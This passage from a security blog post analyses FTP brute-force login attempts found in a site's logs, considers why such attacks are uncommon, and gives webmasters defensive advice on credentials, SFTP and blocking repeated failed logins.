environments where every client must use a unique username. So you need to guess both username and password in order to get access to a site, which dramatically reduces efficiency of brute force attacks (don’t forget the network latency of each FTP request which prevents from testing millions of variants per seconds that one might expect in a latency-free environment).In order to try the brute force approach, hackers need to narrow down their attack to the simplest cases and hope that the Internet is so big that even a tiny fraction of sites with hackable FTP credentials will worth the effort. And the Internet is really big (there are more than 100,000,000 .com domains alone) and to have better results one needs to attacks as many of them as possible, so the set of username/password pairs should be kept as tight as possible to provide results in reasonable time. Based on the above FTP log analysis, the current approach is to target: sites that use their domain name or some easy derivative from a domain name as a username along with a weak password. sites that use the same simple words for both usernames and passwords.Another reason why FTP brute-force attacks are not popular is the FTP logins can be tracked by server administrators who can, for example limit number of consecutive failed login attempts per IP address and then block the offending IPs (for example, using the fail2ban tool).I also guess that many server and client bots might simply lack the FTP brute force functionality…Do you have any better explanation?Why did I see the FTP brute force attacks on that particular site?I have two hypothesis:1. Massive FTP brute force attacks are in the proof of concept stage. A few years ago WordPress brute force attacks were quite rare too, but once criminals figured out that they could be very successful if you had enough resources to attack a large number of site, such attacks went mainstream. So maybe if FTP brute force attacks eventually prove to deliver good results, we’ll see a flood of login attempts in FTP logs of most sites (I hope not).2. In the beginning of the post, I forgot to mention about one more failed login attempt. It used the “anonymous” username and the 66.249.72.181 IP address. The thing is the IP address belongs to Google, more specifically to Googlebot. This means that there are some FTP links (e.g. ftp://example.com ) to that site on the web and Googlebot tries to crawl them using the default anonymous username which normally doesn’t require a password and is used for public FTP sites. Here is the explanation from John Mueller (Webmaster Trends Analyst at Google):When we find links to FTP content, we’ll generally attempt to crawl  those URLs. If they’re publicly accessible and return normal content, we  may choose to index them as well. While it’s not that common, there are  occasionally queries where a file on an FTP server is a good result.So my guess is such attacks may be limited to the sites that have direct FTP links to them on the web.Do you have any better explanation?Just in case. No, the original successful FTP hack that I investigated was not a result of a brute force attack. The username was not obvious and the  password was strong. The attackers used the tried-and-true credential  theft approach.To webmastersRegardless of the chances to see massive FTP brute force attacks in future, the described example should be considered as yet another lesson to all webmasters, who should realize all risks associated with FTP.Carefully choose both username and password.They should not be the sameThe username shoudn’t be easy to guess (e.g.  your site domain name is not the best choice)The password should be strong.Don’t save passwords in FTP programs. Configure them so that they ask for a password every time you connect to your site. If you work with multiple sites and/or don’t like the idea of memorizing many passwords, consider using password managers like KeePass or LastPass — they save your passwords much more securely.Consider using SFTP instead of FTP that sends your passwords in plain  text (they can be easily intercepted, for example, when you use public Wi-Fi). Most popular FTP  programs support SFTP, so the switch should be painless. If you  manage your own server, consider not installing an FTP server  altogether (or uninstalling it now if there are no others users who can’t use SFTP).If you manage a server, consider blocking multiple consecutive failed login attempts at a firewall level (tools like fail2ban may help). Moving FTP to a custom port may also help.Minimize risks of infecting your local computer (which brings you a step closer to password theft). Make sure that all software on your computer is up-to-date. This includes all OS  security updates, all browser updates and all browser plugin updates. Here you can check whether your browser is vulnerable:https://browsercheck.qualys.com/http://www.mozilla.org/en-US/plugincheck/Related posts:10 FTP Clients Malware Steals Credentials FromBeware: FileZilla Doesn’t Protect Your PasswordsWeak Passwords and Tainted WordPress WidgetsIntroduction to Website Parasites﻿                                                                                  Tags: brute-force FTP log analysis                                                    			                                            « Rotating Iframe URLs – One a Minute                Analyzing [Buy Cialis] Search Results »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2013/06/26/ftp-brute-force-attacks/\n');
